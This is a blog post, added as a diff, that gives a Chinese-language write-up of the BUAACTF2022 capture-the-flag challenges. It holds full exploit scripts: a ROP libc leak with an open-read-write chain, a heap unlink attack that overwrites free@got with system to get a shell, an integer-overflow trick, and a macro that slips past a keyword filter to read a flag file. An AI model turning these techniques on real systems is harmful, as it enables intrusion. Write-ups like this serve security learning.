@@ -1,0 +1,266 @@
+---
+title: "BUAACTF2022 WP"
+date: 2022-03-28T13:53:31+08:00
+draft: false
+---
+
+* crypto
+
+** ez game
+求逆，哈希碰撞
+#+begin_src python
+from pwn import *
+from gmpy2 import invert
+
+p = remote("101.43.185.64", "43089")
+# p = remote("49.232.31.80", "8088")
+p.recvuntil("y)\n")
+p.sendline('1')
+sleep(1)
+for i in range(300):
+    p.recvuntil("m): (")
+    a = int(p.recvuntil(", ", drop=True))
+    b = int(p.recvuntil(")", drop=True))
+    # p.interactive()
+    p.sendline(str(invert(a, b)))
+    log.success(str(i))
+p.interactive()
+#+end_src
+
+#+begin_src python
+from pwn import *
+x = "d131dd02c5e6eec4693d9a0698aff95c2fcab58712467eab4004583eb8fb7f8955ad340609f4b30283e488832571415a085125e8f7cdc99fd91dbdf280373c5bd8823e3156348f5bae6dacd436c919c6dd53e2b487da03fd02396306d248cda0e99f33420f577ee8ce54b67080a80d1ec69821bcb6a8839396f9652b6ff72a70".decode("hex")
+
+y = "d131dd02c5e6eec4693d9a0698aff95c2fcab50712467eab4004583eb8fb7f8955ad340609f4b30283e4888325f1415a085125e8f7cdc99fd91dbd7280373c5bd8823e3156348f5bae6dacd436c919c6dd53e23487da03fd02396306d248cda0e99f33420f577ee8ce54b67080280d1ec69821bcb6a8839396f965ab6ff72a70".decode("hex")
+
+# print(hashlib.md5(x).hexdigest())
+# print(hashlib.md5(y).hexdigest())
+p = remote("49.232.31.80", "8088")
+p.recvuntil("y)\n")
+p.sendline('2')
+sleep(2)
+
+p.recvuntil("x:\n")
+p.sendline(x)
+
+sleep(2)
+p.recvuntil("y:\n")
+p.sendline(y)
+p.interactive()
+#+end_src
+** pow
+md5爆破
+#+begin_src python
+from pwn import *
+from pwnlib.util.iters import mbruteforce
+import itertools
+import base64
+# sh = remote("chuj.top", )
+# sh.recvuntil(') == ')
+# hash_code = sh.recvuntil('\n', drop=True).decode().strip()
+hash_code = '9bdd40f1971ae4ae367df318eba20f20'
+app = 'DNtjSOd3PV2JZqXj'
+log.success('hash_code={},'.format(hash_code))
+charset = string.printable
+proof = mbruteforce(lambda x: hashlib.md5((x+app).encode()).hexdigest() ==
+hash_code, charset, 4, method='fixed')
+print(proof)
+# sh.sendlineafter('????> ', proof)
+# sh.interactive()
+#+end_src
+
+* pwn
+
+** math
+最后除法触发signal就给shell。但除数过滤了0，可以用INT_MIN / -1触发整数上溢。
+#+begin_src python
+from pwn import *
+p = process("math")
+p = remote("10.212.27.23", "12138")
+for i in range(20):
+    p.recvuntil("A = :")
+    a = int(p.recvline())
+    p.recvuntil("B = :")
+    b = int(p.recvline())
+    p.recvuntil("a ")
+    op = p.recv(1)
+    p.recvuntil("b:")
+    if(op == "+"):
+        p.sendline(str(a+b))
+    elif(op == "-"):
+        p.sendline(str(a-b))
+    elif(op == "*"):
+        p.sendline(str(a*b))
+p.interactive()
+#+end_src
+** oj & oj_revenge
+第一个题直接fopen就能拿到flag。第二个也只对关键字 =flag= , =open= 之类的做了简单过滤，没有禁用。用宏绕过就行。
+#+begin_src c
+#include <stdio.h>
+#define x f##o##p##e##n
+int main()
+{
+char buf[233];
+char ff[10] = "./fla";
+ff[5] = 'g';
+FILE *fd = x(ff, "r");
+fgets(buf, 233, fd);
+printf(buf);
+}
+#+end_src
+** 拿到shell是一件很嘻哈的事
+[[/img/2022-03-28_shell.png][ida]]
+ida看一眼，发现是orw+rop。
+#+begin_src shell
+ubuntu@pwn:~/bridge/buaactf2022/pwn/shell$ seccomp-tools dump ./shell
+ line  CODE  JT   JF      K
+=================================
+ 0000: 0x20 0x00 0x00 0x00000004  A = arch
+ 0001: 0x15 0x00 0x02 0xc000003e  if (A != ARCH_X86_64) goto 0004
+ 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
+ 0003: 0x15 0x00 0x01 0x0000003b  if (A != execve) goto 0005
+ 0004: 0x06 0x00 0x00 0x00000000  return KILL
+ 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ubuntu@pwn:~/bridge/buaactf2022/pwn/shell$
+#+end_src
+seccomp-tools看到只禁用了execve。那就先泄漏puts的got得到libc基地址，把 "./flag" 字符串写入data段，orw拿到flag。
+#+begin_src python
+from pwn import *
+p = process("./shell")
+# p = remote("10.212.27.23", "4396")
+libc = ELF("./libc-2.27.so")
+elf = ELF("./shell")
+p.recvuntil(":)\n")
+rdiret = 0x0000000000400863
+# leak
+payload1 = 'a'*(0x20+8)+p64(rdiret)+p64(elf.got['puts'])+p64(elf.plt['puts'])+p64(elf.sym['main'])
+p.sendline(payload1)
+p.recvuntil("guess\n")
+putsaddr = u64(p.recvuntil("\x7f").ljust(8, '\x00'))
+libcbase = putsaddr - libc.sym['puts']
+log.success("libc base: " + hex(libcbase))
+
+o = libc.sym['open']+libcbase
+r = elf.plt['read']
+w = elf.plt['puts']
+rsir15ret = 0x400861
+rdxrsiret = 0x00130539+libcbase
+rdxret = 0x01b96+libcbase
+# write file name
+payload2 ='a'*(0x20+8)+p64(rdiret)+p64(0)+p64(rdxrsiret)+p64(16)+p64(elf.sym['__data_start'])+\
+    p64(r)+p64(elf.sym['main'])
+p.recvuntil(":)\n")
+p.sendline(payload2)
+p.recvuntil("guess\n")
+p.sendline("./flag\x00")
+# orw
+pushraxret = 0x001b4d0+libcbase
+payload3 = 'a'*0x28+p64(rdiret)+p64(elf.sym['__data_start'])+p64(rdxrsiret)+p64(0)+p64(0)+p64(o)+p64(elf.sym['main'])
+p.recvuntil(":)\n")
+p.sendline(payload3)
+payload3 = 'a'*0x28+p64(rdiret)+p64(0x3)+p64(rdxrsiret)+p64(30)+p64(elf.sym['__data_start'])+p64(r)
+payload3 += p64(rdiret)+p64(elf.sym['__data_start'])+p64(w)
+p.recvuntil(":)\n")
+p.sendline(payload3)
+p.interactive()
+#+end_src
+** dream
+libc2.34下的堆题。
+[[/img/2022-03-28_new-dream.png][new-dream]]
+new_dream是read后没有写入'\x00'，有信息泄漏。INDEX没有限制上限，可以无限创建新dream；但其实bss里只能放下8个地址，再往后就会覆盖SIZES。可以利用这点来修改SIZES，使得在edit_dream时可以覆盖下一堆块。
+[[/img/2022-03-28_bss.png][dream-bss]]
+[[/img/2022-03-28_edit-dream.png][edit-dream]]
+edit_dream有off-by-null。
+
+那么就可以用edit时的off-by-null让下一堆块认为上一块not in use，触发unlink后可以任意读写。
+[[/img/2022-03-28_unlink.jpeg][unlink]]
+通过读HEAP_PTRS内容拿到堆地址，再计算堆内偏移，读到dream1中保存的unsorted bin addr，leak libc base.
+#+begin_src python
+# leak
+edit_dream(1, p64(0x4040a0))
+read_dream(-2)
+heap_addr = u64(p.recvuntil("Do", drop=True).ljust(8, '\x00'))
+log.success("dream 0 addr: "+ hex(heap_addr))
+edit_dream(1, p64(heap_addr-0x10+0x90+0x20))
+read_dream(-2)
+unsorted_addr = u64(p.recvuntil("Do", drop=True).ljust(8, "\x00"))
+libc_base = unsorted_addr - 0x219cc0
+log.success("libc base: "+hex(libc_base))
+#+end_src
+注意libc2.34中取消了free_hook和malloc_hook，不能通过重写hook来执行system。好在这题只开了partial RELRO，可以写got。往free@got写入system，delete_dream触发拿到shell。
+
+完整exp：
+#+begin_src python
+from pwn import *
+p = process("./dream")
+p = remote("10.212.27.23", "8012")
+libc = ELF("./libc.so.6")
+libc = ELF("/home/ubuntu/glibc-all-in-one/libs/2.34-0ubuntu3_amd64/libc.so.6")
+elf = ELF("./dream")
+def new_dream(length, content):
+    p.sendlineafter("> ", "1")
+    p.sendlineafter("How long is your dream?\n", str(length))
+    p.sendlineafter(" contents of this dream?\n", str(content))
+
+def read_dream(ind):
+    p.sendlineafter("> ", "2")
+    p.sendlineafter("Which dream would you like to read?\n", str(ind))
+
+def edit_dream(ind, content):
+    p.sendlineafter("> ", "3")
+    p.sendlineafter("Which dream would you like to change?\n", str(ind))
+    p.sendline(str(content))
+
+def delete_dream(ind):
+    p.sendlineafter("> ", "4")
+    p.sendlineafter("Which dream would you like to delete?\n", str(ind))
+
+def exp():
+    heap_ptr = 0x4040a0
+    ptr = heap_ptr + 8*1
+    payload1 = p64(0)+p64(0x90)+p64(ptr-0x18)+p64(ptr-0x10)
+    payload1 += 'a'*(0x98-len(payload1)-0x8)
+    payload1 += p64(0x90)
+    new_dream(0x80, '') # 0
+    new_dream(0x98, '') # 1
+    new_dream(0x4f0, '') # 2
+    new_dream(0x7, '/bin/s') # 3
+    new_dream(0x10, '/bin/sh\x00') # 4
+    # unlink
+    edit_dream(1, payload1)
+    delete_dream(2)
+
+    # leak
+    edit_dream(1, p64(0x4040a0))
+    read_dream(-2)
+    heap_addr = u64(p.recvuntil("Do", drop=True).ljust(8, '\x00'))
+    log.success("dream 0 addr: "+ hex(heap_addr))
+    edit_dream(1, p64(heap_addr-0x10+0x90+0x20))
+    read_dream(-2)
+    unsorted_addr = u64(p.recvuntil("Do", drop=True).ljust(8, "\x00"))
+    libc_base = unsorted_addr - 0x219cc0
+    log.success("libc base: "+hex(libc_base))
+
+    # write free got
+    dream4_addr = heap_addr + 0x90+0xa0+0x500+0x20
+    free_hook = libc.sym['__malloc_initialize_hook']+libc_base
+    # free_hook = elf.got['free']
+    sys_addr = libc.sym['system']+libc_base
+    one_gadget = 0xeacf2+ libc_base
+    edit_dream(1, p64(0)+p64(0)+p64(free_hook)+p64(0)+p64(0)+p64(elf.got['free'])+p64(dream4_addr))
+    # p.interactive()
+    edit_dream(3, p64(sys_addr)[:7])
+    # p.interactive()
+    delete_dream(4)
+    p.interactive()
+
+
+
+if __name__ == "__main__":
+    exp()
+#+end_src
+* rev
+** checkin
+简单的置换+异或。反向做一下就出来了。注意输入的时候scanf的格式，和小端序。
+* misc
+只做了签到和问卷，太丢人了。。。
